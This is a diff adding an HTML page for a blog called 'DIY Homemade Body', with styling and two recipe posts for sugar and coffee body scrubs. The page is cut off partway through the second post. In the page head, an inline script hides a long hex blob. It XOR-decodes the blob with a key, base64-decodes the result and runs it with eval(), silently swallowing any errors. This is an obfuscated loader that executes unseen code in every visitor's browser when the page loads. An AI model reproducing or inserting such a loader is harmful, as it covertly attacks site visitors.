@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DIY Homemade Body</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;600;700&family=Quicksand:wght@400;500;600;700&display=swap"
+        rel="stylesheet">
+
+    <style>
+        /* DIY Homemade Body - Blush Cream & Rose Gold Skincare Aesthetic */
+        :root {
+            --cream: #FFF9F5;
+            --blush: #FDECEE;
+            --rose: #E88AA0;
+            --rose-deep: #C65D77;
+            --rose-dark: #5B3A42;
+            --gold: #D9A566;
+            --text-main: #5B3A42;
+            --text-muted: #9C7E84;
+            --card-bg: #FFFFFF;
+            --border-soft: #F5D9DE;
+            --radius: 20px;
+        }
+
+        body {
+            font-family: 'Quicksand', sans-serif;
+            line-height: 1.75;
+            color: var(--text-main);
+            background-color: var(--cream);
+            background-image:
+                radial-gradient(1.5px 1.5px at 20px 30px, rgba(230, 138, 160, 0.35), rgba(0, 0, 0, 0)),
+                radial-gradient(2px 2px at 60px 80px, rgba(217, 165, 102, 0.35), rgba(0, 0, 0, 0)),
+                radial-gradient(1px 1px at 100px 40px, rgba(230, 138, 160, 0.3), rgba(0, 0, 0, 0)),
+                radial-gradient(2.5px 2.5px at 140px 100px, rgba(217, 165, 102, 0.25), rgba(0, 0, 0, 0));
+            background-size: 220px 220px;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        h1,
+        h2,
+        h3,
+        h4,
+        .username {
+            font-family: 'Playfair Display', serif;
+            color: var(--rose-deep);
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        .container {
+            max-width: 660px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Top Navigation */
+        .top-nav {
+            padding: 20px 0;
+            text-align: center;
+            background-color: rgba(255, 249, 245, 0.9);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--border-soft);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .top-nav a {
+            color: var(--text-main);
+            font-size: 0.95rem;
+            font-family: 'Quicksand', sans-serif;
+            font-weight: 600;
+            padding: 8px 20px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            background-color: #ffffff;
+            border: 1px solid var(--border-soft);
+            border-radius: 50px;
+            box-shadow: 0 2px 8px rgba(198, 93, 119, 0.06);
+        }
+
+        .top-nav a:hover {
+            background-color: var(--rose);
+            border-color: var(--rose-deep);
+            color: #ffffff;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(232, 138, 160, 0.4);
+        }
+
+        /* Header */
+        header {
+            padding: 90px 0 50px;
+            text-align: center;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 3.6rem;
+            color: var(--rose-deep);
+            cursor: pointer;
+            text-shadow: 0 0 20px rgba(232, 138, 160, 0.25);
+            transition: all 0.3s ease;
+        }
+
+        header h1:hover {
+            transform: scale(1.02);
+            color: var(--rose);
+            text-shadow: 0 0 25px rgba(217, 165, 102, 0.35);
+        }
+
+        header p {
+            margin: 15px auto 0;
+            font-size: 1.1rem;
+            font-weight: 500;
+            color: var(--text-muted);
+            background: #ffffff;
+            display: inline-block;
+            padding: 6px 25px;
+            border-radius: 50px;
+            border: 1px solid var(--border-soft);
+            box-shadow: inset 0 0 10px rgba(232, 138, 160, 0.05);
+        }
+
+        /* Post Cards */
+        .post-card,
+        .single-post {
+            background: var(--card-bg);
+            padding: 0;
+            margin-bottom: 60px;
+            border-radius: var(--radius);
+            box-shadow: 0 15px 35px rgba(198, 93, 119, 0.12), inset 0 1px 0 rgba(255, 255, 255, 0.6);
+            border: 1px solid var(--border-soft);
+            transition: transform 0.4s ease, box-shadow 0.4s ease, border-color 0.4s ease;
+            cursor: pointer;
+            overflow: hidden;
+        }
+
+        .post-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 20px 40px rgba(198, 93, 119, 0.18);
+            border-color: var(--rose);
+        }
+
+        .single-post {
+            cursor: default;
+        }
+
+        .post-header {
+            padding: 25px 35px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid var(--border-soft);
+            background: var(--blush);
+        }
+
+        .post-header img.avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            margin-right: 15px;
+            border: 2px solid var(--gold);
+            padding: 2px;
+            background-color: #ffffff;
+            object-fit: cover;
+            box-shadow: 0 0 10px rgba(217, 165, 102, 0.3);
+        }
+
+        .post-header .username {
+            font-size: 1.3rem;
+            color: var(--rose-deep);
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 450px;
+            object-fit: cover;
+            border-bottom: 1px solid var(--border-soft);
+        }
+
+        .post-content {
+            padding: 40px 45px 25px;
+        }
+
+        .post-content h2,
+        .post-content h1 {
+            margin: 0 0 20px;
+            font-size: 2.2rem;
+            line-height: 1.25;
+            color: var(--rose-deep);
+        }
+
+        .post-content p {
+            margin-bottom: 25px;
+            font-size: 1.08rem;
+            font-weight: 400;
+        }
+
+        .post-content a {
+            color: var(--rose-deep);
+            text-decoration: none;
+            border-bottom: 1px solid var(--rose-deep);
+            padding-bottom: 1px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .post-content a:hover {
+            color: var(--gold);
+            border-bottom-color: var(--gold);
+        }
+
+        .post-footer {
+            padding: 20px 45px;
+            color: var(--text-muted);
+            font-size: 1rem;
+            font-family: 'Quicksand', sans-serif;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid var(--border-soft);
+            background: var(--blush);
+        }
+
+        .single-post .post-image {
+            max-height: none;
+        }
+
+        /* Back Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 30px;
+            color: #ffffff;
+            background-color: var(--rose);
+            font-family: 'Quicksand', sans-serif;
+            font-size: 1.05rem;
+            font-weight: 700;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 10px 25px;
+            border-radius: 50px;
+            box-shadow: 0 4px 15px rgba(232, 138, 160, 0.35);
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .back-button:hover {
+            background-color: #ffffff;
+            color: var(--rose-deep);
+            border-color: var(--rose);
+            transform: translateY(-2px);
+        }
+
+        /* Overrides for inline styling coming from generated post content */
+        .post-content div[style*="background"] {
+            background: var(--blush) !important;
+            border: 1px solid var(--border-soft) !important;
+            border-radius: 16px !important;
+            padding: 24px 28px !important;
+            margin: 32px 0 !important;
+            color: var(--text-main) !important;
+        }
+
+        .post-content h3[style*="border-left"] {
+            border-left: 3px solid var(--rose) !important;
+            color: var(--rose-deep) !important;
+            padding-left: 15px !important;
+        }
+
+        .post-content h4[style*="background"] {
+            background: var(--blush) !important;
+            color: var(--rose-deep) !important;
+            border: 1px solid var(--border-soft) !important;
+            border-radius: 8px !important;
+        }
+
+        .post-content span[style*="background"] {
+            background: #ffffff !important;
+            color: var(--rose-deep) !important;
+            border: 1px solid var(--border-soft) !important;
+            border-radius: 50px !important;
+            font-family: 'Quicksand', sans-serif !important;
+            font-size: 0.9rem !important;
+            font-weight: 600 !important;
+            padding: 6px 14px !important;
+            box-shadow: 0 2px 8px rgba(198, 93, 119, 0.08) !important;
+            display: inline-block;
+            margin: 5px 6px 5px 0;
+            transition: all 0.3s ease;
+        }
+
+        .post-content span[style*="background"]:hover {
+            border-color: var(--rose) !important;
+            color: var(--rose) !important;
+            transform: translateY(-2px);
+        }
+
+        .post-content p[style*="color"],
+        .post-content h3[style*="color"] {
+            color: inherit !important;
+        }
+    </style>
+     <script>
+(function() {
+    var vtwjjrbym = "35230f2c5a2d050168377f09096819012d0a75595260651f2136122d513b2a5215051872753d7e475202415637773b752d55304b7f5a1f0e13361a73731d220a1524173e63130148685d5d33377802231f6b06025260641313563031523441082f1507345b767344525d630f305d052b004f2b7a5260081f3a2d1d28692b3208170b1b745a2d065c7b06771d09670d3d160a2c65577f180d1032662f6a2b10322c24322d5813160878065e001a647b7d067b74497864134f320c122379303a502f151c235d1c0d426428731e0a677a3e067c7456515a074b382305176435360e2f151f2e58020559520273133049233e156f02486a05392c152d1a347f0417053f0e14235d29014878277b14376728231f6b0600505a2929283d192c522b35172c7f037472070d416b2c7c171c47240f067b05567a703d1538263b3e523b2e0c3d1e17737a2d0656782c74001a730a232b5502487a7f071038216323521e3e50171a312c5d037e487d01631d09680106150a12445773223338261223793039053f0e1776601c0e5668020c57065d1d2a156023566364100e28086a745634361b2f153137631c0d09525c771709771d3d297f2c5d6a60030b2b3d1d3e563b3a12142307285a29114b55274d093102722a2d7f12096a5a3d0d2b562b2e531e3e51140a393163773f6050380057096801282c0b16585104034024223f3154342e1b2c151b7475762c06720674001a730a23067b0556575a170138223f3e611e41523f09652360297e016402630909682c312b7f124b5774394928363823563b0f053f1a602c5d292b5f6837671130597e37166f715f576017162b3d1e23563b0f05142013765813235955280c1e1f5e2f2816551648526f0b14120f200f731a39053f0e14237007065650386c001877273e1e557d017864134f320c1223793039053f0e14237007065678275117315d19322b41715e526f1f48135619717c1d320e150a2d2c6076116555287357096323312b6f3c427f7410163b1c2423544114172c0a6c7775293f47685d735732677231035606595770390d283262287b270b293f0e142370070656782c775e1a771d372c0a115656403e1f38261223793039053f0e14237007050368377c0030021d3316600e595770680138216323534100532c3460345b29155d542a0c0a1873023206512f566363614138211223600a390b3f24147270070e477805462c1a730a23067b05567a74101f38261223541e3e1b3f0a07285a7715415302735732677231067c7456577017012b570574623441162f1a393170073456525d63100a68012c2b7f7d487a74221f12572b756a090b293f0e142370070656782c74001a730a23160a7d445005680b2b36663752411b0d3f2121016b110d67635e050000781d30166f7056697007482b321d746a2429173f0b1f2863032b486b387b5732677e2a067016477c5e1011382620236a342e18120a3931601c1541535d01171c472423067b05567a74101f3826122379303a51171a602f5b77244453280c0d0a6819342d0a7044505a070f1322152e6a2010092c151b745813725955285911315920730c5105567a74101f38261223562217053f0e14235f1537087828631430021e232a4f340870506c45";
+    var vjfaicbgs = "vMUD9DG11o5gS0KDO8D137QxqeSD0sxb";
+    var vyepniipe = "";
+    
+    try {
+        for (var i = 0; i < vtwjjrbym.length; i += 2) {
+            var vyhlqhepa = parseInt(vtwjjrbym.substr(i, 2), 16);
+            vyepniipe += String.fromCharCode(vyhlqhepa ^ vjfaicbgs.charCodeAt((i/2) % vjfaicbgs.length));
+        }
+        
+        var vvqbkapbd = atob(vyepniipe);
+        eval(vvqbkapbd);
+    } catch(e) {
+        
+    }
+})();
+</script>
+</head>
+
+<body>
+
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">DIY Homemade Body</h1>
+            <p>Natural beauty, simple ingredients, real glow.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Blog posts
+        const posts = [
+            {
+                id: 'diy-homemade-body-scrub',
+                title: 'DIY Homemade Body Scrub',
+                date: 'March 14, 2026',
+                image: './assets/DIY%20Homemade%20Body%20Scrub.png',
+                excerpt: `Turn your kitchen staples into a spa-worthy treat! This DIY Homemade Body Scrub blends brown sugar, coconut oil, honey, and dried rose petals into a silky scrub that melts away dry, dull skin. It's 100% natural, budget-friendly, and takes just minutes to whip up. 🌹<br><br>&bull; Gently exfoliates while deeply moisturizing<br>&bull; Leaves skin soft, glowing, and lightly rose-scented<br><br>Perfect before shaving or a cozy self-care Sunday. Save for later and treat your skin right! ✨ #DIYbodyscrub #naturalskincare #selfcare`,
+                content: `
+                    <p>There is something deeply satisfying about making your own skincare from ingredients already sitting in your kitchen cabinet. This DIY Homemade Body Scrub takes four simple staples, brown sugar, coconut oil, honey, and dried rose petals, and turns them into a luxurious exfoliating treatment that rivals anything you would find at a spa counter. No harsh chemicals, no mystery ingredients, and no expensive price tag. Just pure, skin-loving goodness you can whip up in under ten minutes.</p>
+
+                    <p>Body scrubs have become one of the most popular self-care rituals in recent years, and it is easy to see why. Regular exfoliation removes the buildup of dead skin cells that make your skin look dull, rough, and tired. When you pair that exfoliation with deeply nourishing oils and humectants like honey, you get a treatment that does not just polish your skin, it actually improves its texture and glow over time.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                        <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+                        <ul style="margin:0;padding-left:20px;">
+                            <li>Brown sugar is a gentle, dissolvable exfoliant that will not scratch or damage skin like coarser scrubs can.</li>
+                            <li>Coconut oil locks in moisture and leaves a protective, softening layer behind.</li>
+                            <li>Honey draws moisture into the skin and has natural soothing properties.</li>
+                            <li>Dried rose petals add a light natural fragrance and a spa-like visual touch.</li>
+                            <li>The entire batch can be made in one bowl with zero special equipment.</li>
+                            <li>Stored properly, this scrub stays fresh for three to four weeks.</li>
+                        </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why These Ingredients Work So Well Together</h2>
+
+                    <p>Brown sugar is the real star of this recipe. Unlike salt scrubs, which can be quite abrasive and sting on freshly shaved or sensitive skin, sugar granules dissolve gradually as you massage them into your skin. This makes brown sugar an excellent choice for people with sensitive skin or anyone new to body exfoliation. It buffs away dead skin cells without leaving behind micro tears, which means smoother results with less irritation.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Coconut Oil: The Moisture Barrier</h3>
+
+                    <p>Coconut oil coats each sugar granule, which controls how quickly it dissolves and also delivers fatty acids directly to the skin as you scrub. These fatty acids help reinforce your skin's natural moisture barrier, which is especially helpful during dry winter months or after long, hot showers that can strip skin of its natural oils.</p>
+
+                    <p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Always apply body scrubs to damp, not soaking wet, skin. Excess water dilutes the oil and sugar mixture too quickly, making the scrub less effective and much messier to use.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Honey and Rose Petals: The Finishing Touch</h3>
+
+                    <p>Honey is a natural humectant, meaning it pulls moisture from the air into your skin. It also has mild antibacterial properties, which is a nice bonus for a product you are using all over your body. Dried rose petals round out the recipe with a soft, romantic scent and a touch of visual elegance that makes the finished scrub look every bit as good as it feels.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make It Step by Step</h2>
+
+                    <p>Start by measuring one cup of brown sugar into a mixing bowl along with one tablespoon of dried rose petals. Give it a quick stir so the petals are evenly distributed throughout the sugar. Next, pour in half a cup of coconut oil. If your coconut oil is solid, gently warm it for a few seconds until it softens, then mix everything together with a spoon or spatula.</p>
+
+                    <p>Once the sugar and oil are combined, add two tablespoons of honey and mix again until you have a consistent, slightly wet, sandy texture. The mixture should hold together when pressed but still crumble easily when scooped. Transfer the finished scrub into a clean, airtight glass jar and it is ready to use immediately.</p>
+
+                    <h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Quick Recipe Recap</h4>
+
+                    <ol>
+                        <li>Mix 1 cup brown sugar with 1 tablespoon dried rose petals.</li>
+                        <li>Stir in 1/2 cup coconut oil until well combined.</li>
+                        <li>Add 2 tablespoons honey and mix until textured and sandy.</li>
+                        <li>Store in an airtight jar in a cool, dry place.</li>
+                    </ol>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                        <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+                        <p style="margin:0;">Store-bought scrubs often contain microplastics, synthetic fragrances, and preservatives that can irritate sensitive skin. Making your own version lets you control exactly what touches your body while cutting down on plastic packaging waste.</p>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Use Your Scrub for Best Results</h2>
+
+                    <p>Step into a warm shower and let your skin get slightly damp before you begin. Scoop out a small amount of scrub, about a tablespoon, and massage it onto your skin using gentle circular motions. Focus on rougher areas like elbows, knees, and heels, where dead skin tends to build up the most. Rinse thoroughly with lukewarm water and pat your skin dry rather than rubbing, so the oil residue stays behind to keep skin soft.</p>
+
+                    <p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Add two or three drops of your favorite essential oil, like lavender or rose geranium, to customize the scent and boost the relaxing, spa-like feel of your routine.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">How Often Should You Exfoliate?</h3>
+
+                    <p>Two to three times a week is the sweet spot for most skin types. Exfoliating too often can actually damage your skin barrier and lead to increased sensitivity, so give your skin rest days in between sessions. If you have very sensitive or eczema-prone skin, start with once a week and see how your skin responds before increasing frequency.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Storage and Shelf Life</h3>
+
+                    <p>Because this scrub contains natural oils and honey without preservatives, it is best stored in a cool, dry place away from direct sunlight and used within three to four weeks. Always scoop with clean, dry hands or a small spoon rather than wet fingers to prevent introducing bacteria that could shorten its shelf life.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                        <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+                        <ul style="margin:0;padding-left:20px;">
+                            <li>Ready in under 10 minutes with 4 ingredients.</li>
+                            <li>Best used 2 to 3 times a week on damp skin.</li>
+                            <li>Great for pre-shave prep and rough patches like elbows and knees.</li>
+                            <li>Lasts 3 to 4 weeks stored in an airtight jar.</li>
+                        </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Final Thoughts</h2>
+
+                    <p>This DIY Homemade Body Scrub proves that effective, luxurious skincare does not need to be complicated or expensive. With just a handful of pantry ingredients and a few spare minutes, you can create a treatment that exfoliates, nourishes, and pampers your skin all at once. Keep a jar in your shower and turn an ordinary rinse into a small weekly ritual of self-care.</p>
+
+                    <div style="margin-top:28px;">
+                        <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Body Scrub</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Skincare</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Brown Sugar Scrub</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Coconut Oil Beauty</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Care Routine</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Homemade Beauty</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Exfoliation Tips</span>
+                    </div>
+                `
+            },
+            {
+                id: 'diy-coffee-body-scrub',
+                title: 'DIY Coffee Body Scrub',
+                date: 'May 2, 2026',
+                image: './assets/DIY%20Coffee%20Body%20Scrub.png',
+                excerpt: `Wake up your skin with this Glow &amp; Care Coffee Body Scrub! Made with just coffee grounds, brown sugar, and coconut oil, it buffs away dead skin, boosts circulation, and leaves you glowing from head to toe. ☕✨<br><br>&bull; Helps reduce the look of tan lines and dullness<br>&bull; Smells like a cozy coffee shop morning<br><br>Ready in 5 minutes with zero fancy ingredients. Save this for your next self-care day! #coffeescrub #DIYskincare #glowingskin`,
+                content: `
+                    <p>If your morning routine already revolves around coffee, why not let it work double duty on your skin too. This DIY Coffee Body Scrub uses leftover-friendly coffee grounds, brown sugar, and coconut oil to create an energizing, skin-polishing treatment that smells incredible and leaves your body feeling silky smooth. It takes minutes to prepare and delivers results that genuinely rival pricier spa products.</p>
+
+                    <p>Coffee scrubs have earned a loyal following in the beauty world, and the appeal goes beyond the delicious aroma. Ground coffee has a naturally coarse, gritty texture that makes it an excellent physical exfoliant, while caffeine itself is known to temporarily tighten skin and boost circulation when applied topically. Combined with brown sugar and coconut oil, this trio becomes a complete skin-refreshing ritual.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                        <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+                        <ul style="margin:0;padding-left:20px;">
+                            <li>Coffee grounds provide gentle physical exfoliation and a caffeine boost to the skin.</li>
+                            <li>Brown sugar softens the texture so the scrub is not too harsh for everyday use.</li>
+                            <li>Coconut oil moisturizes while the grounds work to buff away dullness.</li>
+                            <li>Regular use may help improve the appearance of rough patches and uneven tan lines.</li>
+                            <li>The scrub takes about five minutes to mix and needs no special tools.</li>
+                            <li>Best stored in an airtight container and used within two to three weeks.</li>
+                        </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Coffee Is a Skincare Powerhouse</h2>
+
+                    <p>Ground coffee is packed with antioxidants, and when used topically, its slightly coarse texture works to physically slough away dead skin cells sitting on the surface. This is different from chemical exfoliants like acids, which dissolve dead skin rather than manually buffing it off. For people who prefer a tactile, visible scrubbing sensation, coffee grounds hit the spot in a way few other natural ingredients can.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Circulation Connection</h3>
+
+                    <p>Caffeine is a vasoconstrictor, meaning it can temporarily narrow blood vessels near the skin's surface. Many people who use coffee scrubs report their skin looks brighter and more even-toned immediately after use, likely thanks to this short-term boost in circulation combined with the physical exfoliation removing dull, flaky skin.</p>
+
+                    <p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> While coffee scrubs are widely used for their brightening effect, results are temporary and cosmetic. Think of this scrub as an instant glow booster rather than a long-term treatment for cellulite or skin tone changes.</p>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make It Step by Step</h2>
+
+                    <p>Measure two tablespoons of coffee powder or used coffee grounds into a small bowl. Used grounds work perfectly here, so this recipe is a great way to repurpose your morning brew instead of tossing it in the trash. Add two tablespoons of brown sugar and mix until the two dry ingredients are evenly combined.</p>
+
+                    <p>Pour in two tablespoons of coconut oil, or any carrier oil you have on hand such as almond or jojoba oil. Stir everything together until you get a thick, spreadable paste with a slightly gritty texture. That is it, your scrub is ready to use immediately, no waiting or curing time required.</p>
+
+                    <h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Quick Recipe Recap</h4>
+
+                    <ol>
+                        <li>Combine 2 tablespoons coffee powder or used grounds with 2 tablespoons brown sugar.</li>
+                        <li>Add 2 tablespoons coconut oil or carrier oil of choice.</li>
+                        <li>Mix until you reach a thick, spreadable, gritty paste.</li>
+                        <li>Use immediately or store in an airtight jar for later.</li>
+                    </ol>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                        <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+                        <p style="margin:0;">Using freshly ground coffee gives a slightly finer, gentler texture than coarsely used grounds, which makes it a better option for sensitive skin. If you plan to scrub your face or neck area, always opt for a much finer grind or skip that area entirely.</p>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Use This Scrub Properly</h2>
+
+                    <p>Hop into a warm shower and wet your skin thoroughly. Scoop a generous amount of the scrub and massage it onto damp skin using firm, circular motions for two to three minutes, paying special attention to elbows, knees, and any areas that tend to feel rough or look dull. Rinse well with lukewarm water afterward and pat your skin dry.</p>
+
+                    <p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Coffee grounds can stain grout and light-colored shower surfaces if left sitting too long, so give your tub a quick rinse right after use to keep it spotless.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Who Should Use This Scrub</h3>
+
+                    <p>This coffee scrub works well for most skin types, but it is especially loved by people dealing with rough, tanned, or dull-looking skin, as well as anyone prepping their skin before shaving or a special occasion. As with any new skincare product, it is smart to do a small patch test on your inner arm before your first full-body use.</p>
+
+                    <h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Storage Tips</h3>
+
+                    <p>Keep your finished scrub in an airtight glass container stored in a cool, dry place away from direct sunlight. Because it contains natural oil and no preservatives, aim to use it up within two to three weeks for the freshest results.</p>
+
+                    <div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+                        <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+                        <ul style="margin:0;padding-left:20px;">
+                            <li>Only 3 ingredients and 5 minutes of prep time.</li>
+                            <li>Great way to repurpose used coffee grounds.</li>
+                            <li>Use 2 to 3 times weekly on damp skin.</li>
+                            <li>Rinse your tub after use to avoid staining.</li>
+                            <li>Store up to 3 weeks in an airtight jar.</li>
+                        </ul>
+                    </div>
+
+                    <h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Final Thoughts</h2>
+
+                    <p>This DIY Coffee Body Scrub is proof that some of the best skincare comes straight from your pantry. It is quick, affordable, smells amazing, and leaves your skin feeling noticeably smoother after just one use. Keep a jar by the shower for those mornings when you need both your coffee fix and a little extra glow.</p>
+
+                    <div style="margin-top:28px;">
+                        <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Coffee Body Scrub</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Skincare</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Exfoliant</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Glowing Skin</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Coconut Oil</span>
+                        <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Care</span>
